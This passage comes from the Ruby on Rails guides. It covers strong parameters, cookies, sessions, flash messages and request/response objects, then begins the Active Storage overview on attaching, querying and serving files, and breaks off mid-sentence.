params = ActionController::Parameters.new(user: { id: 1, admin: "true" })
params.permit(:user)
# => #<ActionController::Parameters {} permitted: true>
params.permit(user: [:id])
# => #<ActionController::Parameters {"user" => #<ActionController::Parameters {"id" => 1} permitted: true>} permitted: true>
params.permit(user: [:id, :admin])
# => #<ActionController::Parameters {"user" => #<ActionController::Parameters {"id" => 1, "admin" => "true"} permitted: true>} permitted: true>
```

All values under a key can be permitted using `{}`:

```ruby
params = ActionController::Parameters.new(user: { id: 1, admin: "true" })
params.permit(user: {})
# => #<ActionController::Parameters {"user" => #<ActionController::Parameters {"id" => 1, "admin" => "true"} permitted: true>} permitted: true>
```

WARNING: Exercise caution when calling `permit` with an empty hash, as it will
allow all current and future model attributes to be mass-assigned.

[`permit`][] is commonly chained with [`require`][] to permit a set of
attributes keyed by a resource name. [`require`][] accepts a single key or an
array of keys. It returns the associated values if found, or raises
`ActionController::ParameterMissing` if any supplied keys are missing.

```ruby
params = ActionController::Parameters.new(user: { id: 1, admin: "true" })
params.require(:user)
# => #<ActionController::Parameters {"id" => 1, "admin" => "true"} permitted: false>
```

As demonstrated above, the object returned by `require(:user)` has not yet been
`permitted`. As such, [`require`][] is often chained with [`permit`][] to return
a set of permitted attributes:

```ruby
params = ActionController::Parameters.new(user: { id: 1, admin: "true" })
params.require(:user).permit(:id, :admin)
# => #<ActionController::Parameters {"id" => 1, "admin" => "true"} permitted: true>
```

Note that [`expect`][] is the recommended technique to permit attributes,
especially when working with nested objects, as it is more explicit about value
types, and hence provides additional safety.

[`permit`]:
  https://api.rubyonrails.org/classes/ActionController/Parameters.html#method-i-permit
[`require`]:
  https://api.rubyonrails.org/classes/ActionController/Parameters.html#method-i-require

##### `permit!`

The [`permit!`][] method sets the `permitted` attribute on an
`ActionController::Parameters` object to `true`. It does no filtering or value
checking whatsoever.

```ruby
params = ActionController::Parameters.new(id: 1, admin: "true")
# => #<ActionController::Parameters {"id"=>1, "admin"=>"true"} permitted: false>
params.permit!
# => #<ActionController::Parameters {"id"=>1, "admin"=>"true"} permitted: true>
```

WARNING: Since `permit!` does not check any values, it bypasses all security
benefits provided by strong parameters. Use with extreme caution.

[`permit!`]:
  https://api.rubyonrails.org/classes/ActionController/Parameters.html#method-i-permit-21

Further details on advanced parameter filtering are available in the
[API docs](https://api.rubyonrails.org/classes/ActionController/Parameters.html).

Cookies
-------

A [cookie](https://en.wikipedia.org/wiki/HTTP_cookie) (also known as an HTTP
cookie or a web cookie) is a small piece of data from the server that is saved
in the user's browser. The browser may store cookies, create new cookies, modify
existing ones, and send them back to the server with later requests. Cookies
persist data across web requests and therefore enable web applications to
remember user preferences.

Rails provides access to cookies in a controller via the [`cookies`][] method,
which returns an instance of [`ActionDispatch::Cookies`][].
[`ActionDispatch::Cookies`][] is a key-value store and is similar to a Ruby
Hash.

```ruby
class PreferencesController < ApplicationController
  def new
    # Read data from a cookie
    @preferences = cookies[:preferences]
  end

  def create
    # Write data to a cookie
    cookies[:preferences] = params.expect(preferences: {})
  end

  def destroy
    # Delete a key from a cookie
    cookies.delete(:preferences)
  end
end
```

NOTE: Setting a key to `nil` will not delete the cookie. You need to use
`cookies.delete(:key)`.

Cookies have a
[default lifetime](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#removal_defining_the_lifetime_of_a_cookie)
of `Session`, so they will be deleted when the user closes their browser.

Create a _permanent cookie_ that expires at a specific time by passing a hash
with the `:expires` option:

```ruby
cookies[:remember_me] = { value: "true", expires: 1.month }
```

Rails also provides a _permanent cookie jar_ that automatically sets the
expiration date to 20 years from the time of creation:

```ruby
cookies.permanent[:locale] = "fr"
```

### Encrypted and Signed Cookies

Since cookies are stored on the client browser, they can be susceptible to
tampering and are not considered secure for storing sensitive data. Rails
provides signed and encrypted cookie jars for storing sensitive data.

The signed cookie jar appends a cryptographic signature on the cookie data to
protect its integrity. The data can be read by a user, but cannot be tampered
with as it is cryptographically signed.

```ruby
cookes.signed[:preferences] = @user.preferences.to_h
```

The encrypted cookie jar encrypts the data in addition to signing it, so that it
cannot be read by the user nor tampered with.

```ruby
cookes.encrypted[:remember_token] = @user.remember_token
```

Refer to the
[API documentation](https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)
for more details.

These special cookie jars use a serializer to serialize the cookie values into
strings and deserialize them into Ruby objects when read back. The default
serializer for new applications is `:json`.

You can specify the serializer via
[`config.action_dispatch.cookies_serializer`][].

NOTE: Be aware that JSON has limited support serializing Ruby objects such as
`Date`, `Time`, and `Symbol`. These will be serialized and deserialized into
`String`s.

If you need to store these or more complex objects, you may need to manually
convert their values when reading them in subsequent requests.

[`config.action_dispatch.cookies_serializer`]:
  configuring.html#config-action-dispatch-cookies-serializer
[`ActionDispatch::Cookies`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html
[`cookies`]:
  https://api.rubyonrails.org/classes/ActionController/Cookies.html#method-i-cookies

Session
-------

Rails provides a _session_ object which is used to store data relevant to the
current user session. For example, data related to user authentication may be
stored in the session object.

Session data is stored in an encrypted cookie by default, but other stores
[may be configured](#session-stores).

### Working with the Session

The session is available in the controller and the view via the `session` method
which returns an instance of `ActionDispatch::Http::Session`. This object is a
key-value store and values can be accessed and set in the same way as a Ruby
Hash.

```ruby
class SessionsController < ActionController::Base
  # Read the session to redirect the user back to their initial location
  # after a log in, or redirect them to the root path if no location is set.
  def create
    # ...

    redirect_to session[:initial_location] || root_path
  end
end
```

To store data the session, assign a value to a key as you would in a Ruby Hash.

```ruby
class ProductsController < ApplicationController
  def create
    # ...

    # Handle logged out user
    session[:initial_location] = request.referer
    redirect_to login_path
  end
end
```

To remove something from the session, delete the key:

```ruby
class ProductsController < ApplicationController
  def new
    session.delete(:initial_location)
  end
end
```

Delete all data and create a new session object using [`reset_session`][]. It is
recommended to use `reset_session` before logging in to avoid
[session fixation attacks](security.html#session-fixation).

NOTE: Sessions are lazily loaded. If you don't access sessions in your action's
code, they will not be loaded. Hence, you will never need to disable sessions -
not accessing them will do the job.

[`reset_session`]:
  https://api.rubyonrails.org/classes/ActionController/Metal.html#method-i-reset_session

### Session Stores

The storage mechanism for session data can be configured. By default, data is
stored in an encrypted cookie, but other stores are available.

All sessions have a unique ID representing the session object. Regardless of the
chosen store, this session ID is always stored in a cookie. The session data can
be stored using one of the following storage mechanisms:

- [`ActionDispatch::Session::CookieStore`][] - Stores the data in an encrypted
  cookie.
- [`ActionDispatch::Session::CacheStore`][] - Stores the data in the Rails
  cache.
- [`ActionDispatch::Session::ActiveRecordStore`][activerecord-session_store] -
  Stores the data in a database using Active Record (requires the
  [`activerecord-session_store`][activerecord-session_store] gem).
- A custom store or a store provided by a third party gem.

For most session stores, Rails uses the unique session ID in the cookie to read
session data from your chosen store. Rails does not allow you to pass the
session ID in the URL as this is less secure.

#### `CookieStore`

The `CookieStore` is the default and recommended session store. It stores all
session data, including the session ID, in an encrypted cookie. The
`CookieStore` is lightweight and does not require any configuration to use in a
new application.

Cookies are limited 4 kB of data, and the cookie store is bound by this limit.
While this is lesser than the other storage options, it is usually enough.
Storing large amounts of data in the session is discouraged. You should
especially avoid storing complex objects (such as model instances) in the
session.

#### `CacheStore`

You can use the `CacheStore` if your sessions don't store critical data or don't
need to be around for long periods. This will store sessions using the cache
implementation you have configured for your application. The advantage is that
you can use your existing cache infrastructure for storing sessions without
requiring any additional setup or administration. The downside is that the
session storage will be temporary and data could disappear at any time.

Read more about session storage in the [Security Guide](security.html#sessions).

### Configuring the Session

Some aspects of the session can be configured.

Set the session store using:

```ruby
# config/initializers/sessions.rb

Rails.application.config.session_store :cache_store
```

When using the cookie store, Rails automatically sets the name of the cookie.
However, this can also be configured:

```ruby
# config/initializers/sessions.rb

Rails.application.config.session_store :cookie_store, key: "_your_app_session"
```

NOTE: Be sure to restart your server when you modify an initializer file.

You can also pass a `:domain` key and specify the domain name for the cookie:

```ruby
Rails.application.config.session_store :cookie_store, key: "_your_app_session", domain: ".example.com"
```

See [`config.session_store`](configuring.html#config-session-store) in the
configuration guide for more information.

NOTE: Signed and encrypted cookies, including the session when using the cookie
store, are signed using the `secret_key_base` generated for all new Rails
applications. It is usually stored in the encrypted credentials file:
`config/credentials.yml.enc`. Changing the `secret_key_base` will render all
signed and encrypted cookies unreadable. Refer to the
[security guide](security.html#custom-credentials) for further information.

[`ActionDispatch::Session::CookieStore`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Session/CookieStore.html
[`ActionDispatch::Session::CacheStore`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Session/CacheStore.html
[activerecord-session_store]:
  https://github.com/rails/activerecord-session_store

### The Flash

The [flash](https://api.rubyonrails.org/classes/ActionDispatch/Flash.html)
provides a way to pass temporary data between controller actions invoked in
successive HTTP requests.

Anything you place in the flash will be available in the very next request, and
then cleared.

The flash is typically used for setting messages such as notices and alerts in a
controller action, before redirecting to an action that displays the message.

The flash is accessed via the [`flash`][] method which returns an instance of
[`ActionDispatch::Flash::FlashHash`][]. Similar to the session, the flash values
are stored as key-value pairs exactly like a Ruby Hash.

Consider the below example where the controller sets a flash message after a
product is created, which will be available to display during the next request
after the user is redirected.

```ruby
class ProductsController < ApplicationController
  def create
    # ...

    flash[:notice] = "Your product was created!"
    redirect_to products_path, status: :see_other
  end
end
```

You may use different keys to assign different message types:

```ruby
flash[:notice]  = "Your product was created!"
flash[:alert]   = "Sorry, something when wrong while creating your product."
flash[:warning] = "Your product was created, but there were some problems."
```

Set a flash message when calling `redirect_to` by including it as a parameter:

```ruby
# Equivalent to setting flash[:notice]
redirect_to root_url, notice: "Your product was created!"

# Equivalent to setting flash[:alert]
redirect_to root_url, alert: "Sorry, something when wrong when creating your product."
```

Only `notice:` and `alert:` options may be used at the top-level. Storing
messages under other keys needs the `flash:` option:

```ruby
# Equivalent to setting flash[:warning]
redirect_to root_url, flash: { warning: "Your product was created, but there were some problems." }
```

The flash does not render anything in the UI — it is a short-term data storage
mechanism. Reading flash data and rendering the appropriate HTML is left up the
the developer.

[`ActionDispatch::Flash::FlashHash`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Flash/FlashHash.html

#### Displaying Flash Messages

It is recommend to add code to render flash messages in your application layout,
so messages are automatically rendered on every page without additional steps.

Iterate through all the keys and values to render all set messages, and then you
can use CSS to style the different types of messages based on their type:

```erb
<%# app/views/layouts/application.html.erb %>

<html>
  <%# ... %>
  <body>
    <% flash.each do |type, message| -%>
      <%= tag.div class: class_names("flash", type) do %>
        <p><%= message %></p>
      <% end %>
    <% end -%>

    <%# ... %>
    <%= yield %>
  </body>
</html>
```

#### `flash.keep` and `flash.now`

[`flash.keep`][] is used to carry over the flash value through to an additional
request. This is useful when there are multiple redirects.

For example, assume that the `root_url` routes to the `index` action in the
controller below, and all requests here are redirected to
`UsersController#index`.

If an action sets the flash and redirects to `MainController#index`, those flash
values will be lost during the next redirect.

Use `flash.keep` to persist the values in the flash for one more request.

```ruby#4,7
class MainController < ApplicationController
  def index
    # Persists all flash values.
    flash.keep

    # Persists only the `:notice` value.
    flash.keep(:notice)

    # ...
  end
end
```

By default, setting flash value will make them available to the next request.
[`flash.now`][] is used to make the flash values available in the same request.

In the below example, when the `create` action fails to save a resource, the
`new` template is rendered.

Since there is no redirection, the response will not immediately trigger another
HTTP request. Use `flash.now` to display a message using the flash in this case.
This will make the message available in only the current request.

```ruby
class ProductsController < ApplicationController
  def create
    @product = Product.new(product_params)
    if @product.save
      # ...
    else
      flash.now[:error] = "The product could not be saved"
      render "new", status: :unprocessable_content
    end
  end
end
```

[`flash`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Flash/RequestMethods.html#method-i-flash
[`flash.keep`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Flash/FlashHash.html#method-i-keep
[`flash.now`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Flash/FlashHash.html#method-i-now

The Request and Response Objects
--------------------------------

Every controller has two methods, [`request`][] and [`response`][], which can be
used to access the request and response objects associated with the current
request cycle.

The `request` method returns an instance of [`ActionDispatch::Request`][]. The
[`response`][] method returns an instance of [`ActionDispatch::Response`][].

[`ActionDispatch::Request`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Request.html
[`request`]:
  https://api.rubyonrails.org/classes/ActionController/Base.html#method-i-request
[`response`]:
  https://api.rubyonrails.org/classes/ActionController/Base.html#method-i-response
[`ActionDispatch::Response`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Response.html

### The `request` Object

The request object contains useful information about the request coming in from
the client. This section describes the purpose of some of the properties of the
`request` object.

The full list of the available methods can be viewed in the
[Rails API documentation](https://api.rubyonrails.org/classes/ActionDispatch/Request.html)
and [Rack](https://rack.github.io/rack/main/Rack/Request.html) documentation.

| Property of `request`                     | Purpose                                                                          |
| ----------------------------------------- | -------------------------------------------------------------------------------- |
| `host`                                    | The hostname used for this request.                                              |
| `domain(n=2)`                             | The hostname's first `n` segments, starting from the right (the TLD).            |
| `format`                                  | The content type requested by the client.                                        |
| `method`                                  | The HTTP method used for the request.                                            |
| `get?`, `post?`, `patch?`, `put?`, `delete?`, `head?`, `query?` | Returns true if the HTTP method is GET/POST/PATCH/PUT/DELETE/HEAD/QUERY. |
| `safe_method?`, `unsafe_method?`          | Returns true if the HTTP method is safe (GET, HEAD, QUERY, OPTIONS, TRACE) / unsafe. |
| `headers`                                 | Returns a hash containing the headers associated with the request.               |
| `port`                                    | The port number (integer) used for the request.                                  |
| `protocol`                                | Returns a string containing the protocol used plus "://", for example "http://". |
| `query_string`                            | The query string part of the URL, i.e., everything after "?".                    |
| `remote_ip`                               | The IP address of the client.                                                    |
| `url`                                     | The entire URL used for the request.                                             |

#### `query_parameters`, `request_parameters`, and `path_parameters`

Rails collects all of the parameters for a given request in the `params` hash,
including the ones set in the URL as query string parameters, and those sent as
the body of a `POST` request. The request object has three methods that give you
access to the various parameters.

- [`query_parameters`][] - contains parameters that were sent as part of the
  query string.
- [`request_parameters`][] - contains parameters sent as part of the post body.
- [`path_parameters`][] - contains parameters parsed by the router as being part
  of the path leading to this particular controller and action.

[`path_parameters`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Http/Parameters.html#method-i-path_parameters
[`query_parameters`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Request.html#method-i-query_parameters
[`request_parameters`]:
  https://api.rubyonrails.org/classes/ActionDispatch/Request.html#method-i-request_parameters

### The `response` Object

The response object is built up during the execution of the action from
rendering data to be sent back to the client browser. It's not usually used
directly but sometimes, in an `after_action` callback for example, it can be
useful to access the response directly. One use case is for setting the content
type header:

```ruby
response.content_type = "application/pdf"
```

Another use case is for setting custom response headers:

```ruby
response.headers["X-Custom-Header"] = "some value"
```

The `headers` attribute is a hash which maps header names to header values.
Rails sets some headers automatically but if you need to update a header or add
a custom header, you can use `response.headers` as in the example above.

NOTE: The `headers` method can be accessed directly in the controller as well.

Here are some of the properties of the `response` object:

| Property of `response` | Purpose                                                                                             |
| ---------------------- | --------------------------------------------------------------------------------------------------- |
| `body`                 | This is the string of data being sent back to the client. This is most often HTML.                  |
| `status`               | The HTTP status code for the response, like 200 for a successful request or 404 for file not found. |
| `location`             | The URL the client is being redirected to, if any.                                                  |
| `content_type`         | The content type of the response.                                                                   |
| `charset`              | The character set being used for the response. Default is "utf-8".                                  |
| `headers`              | Headers used for the response.                                                                      |

To get a full list of the available methods, refer to the
[Rails API documentation](https://api.rubyonrails.org/classes/ActionDispatch/Response.html)
and [Rack Documentation](https://rack.github.io/rack/main/Rack/Response.html).


<!-- ===== guides/source/active_storage_overview.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON
<https://guides.rubyonrails.org>.**

Active Storage Overview
=======================

This guide covers how to attach files to your Active Record models.

After reading this guide, you will know:

* How to attach one or many files to a record.
* How to display attached files and how to delete them.
* How to use variants to transform images.
* How to generate an image representation of a non-image file (e.g. PDF).
* How to send file uploads directly from browsers to a storage service.
* How to set up cloud storage services to work with Active Storage.

--------------------------------------------------------------------------------

What is Active Storage?
-----------------------

Active Storage facilitates attaching files to Active Record objects and
uploading those files to your server or to a cloud storage service.

Active Storage supports image variants (e.g. resizing) and can transform and
store variants of uploaded images. Using Active Storage, you can also generate
image representations of non-image uploads like PDFs and videos, and extract
metadata.

For cloud storage services, Active Storage supports mirroring files to secondary
services to serve as a backup or to allow migration between services. Active
Storage also supports Direct Uploads, allowing files to be uploaded straight
from the client's browser to the configured cloud storage service. This avoids
routing large files through your Rails servers.

Active Storage also supports a `Disk` service which uses the local filesystem by default.

Setup and Configuration
-----------------------

Let's see Active Storage in action with an example of allowing users to upload a
profile photo. First step is to install Active Storage:

```bash
$ bin/rails active_storage:install
$ bin/rails db:migrate
```

The install command creates migrations to add the following Active Storage
specific tables to your application:

* `active_storage_blobs` - stores data about uploaded files, such as filename
  and content type.
* `active_storage_attachments` - a polymorphic join table that [connects your
  models to blobs](#attaching-files-to-records). This is a [polymorphic
  association](association_basics.html#polymorphic-associations) so if your
  model's class name changes, you will need to run a migration to update the
  underlying `record_type` column in this table to the new name.
* `active_storage_variant_records` - if [variant
  tracking](#attaching-files-to-records) is enabled, this table stores records
  for each variant that has been generated.

WARNING: If you are using UUIDs instead of integers as the primary key on your
models, you will need to set `Rails.application.config.generators { |g| g.orm
:active_record, primary_key_type: :uuid }` in a config file. This configuration
needs to be set *before* running the `active_storage:install` command.

NOTE: Since Active Storage relies on [polymorphic
associations](association_basics.html#polymorphic-associations), which store
Ruby class names in the database, you will need to manually update Active
Storage tables if you rename related Ruby classes (e.g.
`active_storage_attachments.record_type` table and column).

### Third Party Software

Various features of Active Storage depend on third-party software. Rails does
not install these by default so you will need to do so separately:

* [libvips](https://github.com/libvips/libvips) or
  [ImageMagick](https://imagemagick.org/) - for image analysis and
  transformations.
* [ffmpeg](http://ffmpeg.org/) - for video previews and ffprobe for video/audio
  analysis.
* [poppler](https://poppler.freedesktop.org/) or [muPDF](https://mupdf.com/) -
  for PDF previews.

TIP: ImageMagick is better known and more widely available. Libvips is a newer
library that runs quickly and uses little memory.

WARNING: Before you install and use third-party software, make sure you
understand the licensing implications of doing so. MuPDF, in particular, is
licensed under AGPL and requires a commercial license for some use.

### Configuring Storage Service

For local development and testing, you can use the `Disk` service to store
uploaded files. It can be configured in `config/storage.yml` as follows:

```yml
test:
  service: Disk
  root: <%= Rails.root.join("tmp/storage") %>

local:
  service: Disk
  root: <%= Rails.root.join("storage") %>
```

The services configured in the `config/storage.yml` file are then used in
environment specific configuration files. For example, in order to use the
`local` service above during development, we modify the
`config/environments/development.rb` file:

```ruby
# config/environments/development.rb
config.active_storage.service = :local
```

The `config/storage.yml` file is also where cloud services can be configured.
For example, assuming there is a service called `amazon` in the
`config/storage.yml` file, in order to use that service in production:

```yml
# config/environments/production.rb
config.active_storage.service = :amazon
```

You can find detailed information about [configuring cloud
services](#configuring-cloud-services) in a later section.

### Configuring Active Storage Routes

Active Storage automatically adds routes to your application for serving files.
These routes are mounted under `/rails/active_storage` by default. For example,
So when someone requests a file attachment in your app, the URL may look like
`https://example.com/rails/active_storage/blobs/redirect/eyJf.../photo.jpg`. You can see all the routes by running:

```bash
$ bin/rails routes --grep active_storage
```

To mount Active Storage routes at a different path, you can configure
`config.active_storage.routes_prefix` in `config/application.rb`. It accepts any
value supported by Rails'
[`scope`](https://api.rubyonrails.org/classes/ActionDispatch/Routing/Mapper/Scoping.html#method-i-scope) routing method:

```ruby
config.active_storage.routes_prefix = "/files"
config.active_storage.routes_prefix = { path: "/files", subdomain: "assets" }
```

Attaching Files to Records
--------------------------

Once Active Storage is installed and configured, we can upload files attached to
an Active Record model, display those files in a view, replace or remove those
files, as well as create variants.

### `has_one_attached`

The [`has_one_attached`][] method sets up a one-to-one mapping between records
and files. Each record can have one file attached to it.

For example, suppose your application has a `User` model. If you want each user
to have a profile photo, define the `User` model as follows:

```ruby
class User < ApplicationRecord
  has_one_attached :profile_photo
end
```

You can also specify an attachment when using a model generator command like
this:

```bash
$ bin/rails generate model User profile_photo:attachment
```

In order to allow a user to upload a profile photo, you can add this to the form
partial:

```erb
<%= form.file_field :profile_photo %>
```

Then in the User controller, add `:profile_photo` to the allowed params:

```ruby
class UserController < ApplicationController
  def create
    user = User.create!(user_params)
    redirect_to root_path
  end

  private
    def user_params
      params.expect(user: [:email_address, :password, :profile_photo])
    end
end
```

Now a user will be able to upload a profile photo.

Some more useful methods are [`attach`][Attached::One#attach] and
[`attached?`][Attached::One#attached?].

The `attach` method attaches a profile photo to an existing user:

```ruby
user.profile_photo.attach(params[:profile_photo])
```

The `attached?` method determines whether a particular user has a profile photo:

```ruby
user.profile_photo.attached?
```

You can override the default configured service for a specific attachment with
the `service` option:

```ruby
class User < ApplicationRecord
  has_one_attached :profile_photo, service: :amazon
end
```

[`has_one_attached`]:
https://api.rubyonrails.org/classes/ActiveStorage/Attached/Model.html#method-i-has_one_attached
[Attached::One#attach]:
https://api.rubyonrails.org/classes/ActiveStorage/Attached/One.html#method-i-attach
[Attached::One#attached?]:
https://api.rubyonrails.org/classes/ActiveStorage/Attached/One.html#method-i-attached-3F

### `has_many_attached`

The [`has_many_attached`][] method sets up a one-to-many relationship between a
record and attached files. Each record can have many files attached to it.

For example, suppose your application has a `Product` model. Each product can
have multiple images associated with it:

```ruby
class Product < ApplicationRecord
  has_many_attached :images
end
```

You can also use the model generator command like this:

```bash
$ bin/rails generate model Product images:attachments
```

The controller to create a product with multiple images looks like this:

```ruby
class ProductsController < ApplicationController
  def create
    product = Product.create!(product_params)
    redirect_to product
  end

  private
    def product_params
      params.expect(product: [ :title, :content, images: [] ])
    end
end
```

You can call [`images.attach`][Attached::Many#attach] to add new images to an
existing product:

```ruby
@product.images.attach(params[:images])
```

You can call [`images.attached?`][Attached::Many#attached?] to determine whether
a particular product has any images:

```ruby
@product.images.attached?
```

NOTE: When using `has_many_attached`, calling `images.attach(...)` adds new
attachments to the list of existing attachments. It does not replace or
overwrite existing attachments. If you want to replace existing images, you must
explicitly [purge](#removing-files) the old attachments before attaching new
ones.

You can also configure specific variants by calling the `variant` method on the
attachable object:

```ruby
class Message < ApplicationRecord
  has_many_attached :images do |attachable|
    attachable.variant :thumb, resize_to_limit: [100, 100]
  end
end
```

[`has_many_attached`]:
https://api.rubyonrails.org/classes/ActiveStorage/Attached/Model.html#method-i-has_many_attached
[Attached::Many#attach]:
https://api.rubyonrails.org/classes/ActiveStorage/Attached/Many.html#method-i-attach
[Attached::Many#attached?]:
https://api.rubyonrails.org/classes/ActiveStorage/Attached/Many.html#method-i-attached-3F

#### Adding New Attachments: Appending vs. Replacing

When working with the `has_many_attached` association, it’s important to
distinguish between calling `.attach` directly in Ruby and assigning attachments
through form parameters.

Calling `.attach` always appends new files. It never replaces existing
attachments:

```ruby
# Appends new images, previously attached images remain.
@product.images.attach(params[:new_images])
```

When a form submits `images: params`, Rails treats the submitted list as the
entire intended set of attachments for that field. If the form only includes the
newly uploaded files, Rails will interpret that as replacing the collection.

To keep existing attachments, you can use hidden form fields with the
[`signed_id`][ActiveStorage::Blob#signed_id] to re-submit each of the already
attached file:

```erb
<% @product.images.each do |image| %>
  <%= form.hidden_field :images, multiple: true, value: image.signed_id %>
<% end %>

<%= form.file_field :images, multiple: true %>
```

The above code resubmits the already-attached images back to Rails using hidden
fields, so Active Storage keeps the existing attached images when adding a new
one.

[ActiveStorage::Blob#signed_id]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob.html#method-i-signed_id

### Attaching Files From Disk

Active Storage allows you to attach files that are not uploaded via a form. In
order to attach a file that you generated on disk or downloaded from a URL, you
can use the `io` and `filename` options with the `attach` method. You may also
use this method to attach fixture files during testing.

```ruby
@product.images.attach(io: File.open("/path/to/file"), filename: "product.pdf")
```

Active Storage attempts to determine a file’s content type from its data. It
falls back to the content type you provide if it can’t do that. So it's a good
practice to use the `content_type` option to specify the content type when
possible:

```ruby
@product.images.attach(io: File.open("/path/to/file"), filename: "product.pdf", content_type: "application/pdf")
```

You can also instruct Active Storage not to infer content type from the data by
using the`identify` option:

```ruby
@product.images.attach(
  io: File.open("/path/to/file"),
  filename: "product.pdf",
  content_type: "application/pdf",
  identify: false
)
```

If you don’t provide a content type and Active Storage can’t determine the
file’s content type automatically, it defaults to `application/octet-stream`.

#### Cloud Storage

For organizing files in sub-folders within your cloud storage (e.g. AWS S3
Bucket), there is a `key` option:

NOTE: The `key` parameter is treated as trusted. Using untrusted user input as the key may result in unexpected behavior.

```ruby
@product.images.attach(
  io: File.open("/path/to/file"),
  filename: "file.pdf",
  content_type: "application/pdf",
  key: "#{Rails.env}/blog_content/intuitive_filename.pdf",
  identify: false
)
```

Without the `key` specified, AWS S3 uses a random key to name your files. But
with the above `key`, the file will get saved in the folder
`[S3_BUCKET]/development/blog_content/` when you test this from your development
environment. When you use the `key` parameter, you have to ensure that the key
is unique for the upload to be successful. It is recommended to append the
filename with a random number, something like:

```ruby
def s3_file_key
  "#{Rails.env}/blog_content/intuitive_filename-#{SecureRandom.uuid}.pdf"
end
```

```ruby
@product.images.attach(
  io: File.open("/path/to/file"),
  filename: "product.pdf",
  content_type: "application/pdf",
  key: s3_file_key,
  identify: false
)
```

### Form Validation

Attachments aren't sent to the storage service until a successful `save` on the
associated record. This means that if a form submission fails validation, any
new attachments will be lost and must be uploaded again. [Direct
uploads](#direct-uploads) work differently. They are stored before the form is
submitted, so they retain uploads even when validation fails:

```erb
<%= form.hidden_field :profile_photo, value: @user.profile_photo.signed_id if @user.profile_photo.attached? %>
<%= form.file_field :profile_photo, direct_upload: true %>
```

Querying Attached Files
-----------------------

Since Active Storage attachments are Active Record associations, you can use the
usual [query methods](active_record_querying.html) to look up records associated
with attachments in the Active Storage related tables.

### `has_one_attached`

When you declare `has_one_attached :profile_photo`, Rails automatically sets up
two associations behind the scenes: a `has_one` association called
`profile_photo_attachment`, which points to the `active_storage_attachments`
table, and a `has_one :through` association called `profile_photo_blob`, which
points to the `active_storage_blobs` table through the attachment record.

Because these associations behave like normal Active Record relations, you can
query them. For example, the following query joins the `users` table to the blob
record and filters for all users whose profile_photo has a PNG content type:

```ruby
class User < ApplicationRecord
  has_one_attached :profile_photo
end

# Query users whose profile_photo is a PNG
users = User.joins(:profile_photo_blob).where(
  active_storage_blobs: { content_type: "image/png" }
)
```

### `has_many_attached`

Similarly, when you use `has_many_attached`, Rails defines two associations: a
`has_many` association named `<name>_attachments`, which represents the join
records in the `active_storage_attachments` table, and a `has_many :through`
association named `<name>_blobs`, which gives access to the corresponding rows
in `active_storage_blobs` table.

Because the `_blobs` association provides a normal relational join, you can
query it directly to filter records based on metadata stored in the blob. For
example, the following code retrieves all `Product` records whose attached
images are videos with an MP4 format:

```ruby
class Product < ApplicationRecord
  has_many_attached :images
end

products = Product.joins(:images_blobs).where(
  active_storage_blobs: { content_type: "video/mp4" }
)
```

This query executes against the `active_storage_blobs` table rather than the
attachment records themselves, since the join created by `joins(:images_blobs)`
operates on the blob side of the association. You can combine such blob-based
filters with additional scope conditions in the same way you would with any
standard Active Record query.

Serving Files
-------------

Active Storage can serve files in two different ways: redirect mode and proxy
mode. Both modes use built-in controllers to deliver blobs and
[representations](#file-representations), but they differ in how the file
ultimately reaches the browser.

WARNING: All Active Storage controllers are publicly accessible by default.
Anyone who knows the URL can access the file, even if the rest of your
application requires authentication. If your files require access control
consider implementing [Authenticated Controllers](#authenticated-controllers).

### Redirect Mode

To generate a permanent URL for a blob, you can pass the attachment or the blob
to the [`url_for`][ActionView::RoutingUrlFor#url_for] view helper. This
generates a URL with the blob's [`signed_id`][ActiveStorage::Blob#signed_id]
which points to the blob's
[`RedirectController`][`ActiveStorage::Blobs::RedirectController`]

```ruby
url_for(user.profile_photo)
# => https://www.example.com/rails/active_storage/blobs/redirect/:signed_id/my-profile-photo.png
```

The `RedirectController` does not serve the file itself. Instead, it takes the
permanent, signed Rails URL and issues a redirect to a short-lived service URL
(e.g. an expiring S3 URL). This indirection decouples your application’s public
URLs from the underlying storage service and enables features such as mirroring
attachments across multiple services for high-availability. The redirect
response is cached by the browser for 5 minutes by default.

To create a download link, use the `rails_blob_{path|url}` helpers. These
helpers generate the same permanent Rails URL but allow you to specify the file
[Content-Disposition Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition).

```ruby
rails_blob_path(user.profile_photo, disposition: "attachment")
```

WARNING: To prevent XSS attacks, Active Storage forces the Content-Disposition
header to "attachment" for certain file types. To change this behavior see the
available configuration options in [Configuring Rails
Applications](configuring.html#configuring-active-storage).

If you need to create a link from outside of controller/view context, for
background jobs for example, you can access the `rails_blob_path` like this:

```ruby
Rails.application.routes.url_helpers.rails_blob_path(user.profile_photo, only_path: true)
```

[ActionView::RoutingUrlFor#url_for]:
https://api.rubyonrails.org/classes/ActionView/RoutingUrlFor.html#method-i-url_for
[ActiveStorage::Blob#signed_id]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob.html#method-i-signed_id

### Proxy Mode

In proxy mode, Rails retrieves the file from the storage service and then
proxies it back to the client. Instead of sending a redirect, Rails responds
with the file data directly from your application server.

The default configuration mode is `rails_storage_redirect`. You can configure
Active Storage to use proxying like this:

```ruby
# config/initializers/active_storage.rb
Rails.application.config.active_storage.resolve_model_to_route = :rails_storage_proxy
```

Or if you want to explicitly proxy specific attachments there are URL helpers
you can use in the form of `rails_storage_proxy_path` and
`rails_storage_proxy_url`.

```erb
<%= image_tag rails_storage_proxy_path(@user.profile_photo) %>
```

#### Putting a CDN in Front of Active Storage

To use a CDN in front of Active Storage attachments, you must generate URLs
using proxy mode. In proxy mode, files are served through your application
rather than redirected to the underlying storage service. This allows the CDN to
cache the file without additional configuration, because the default Active
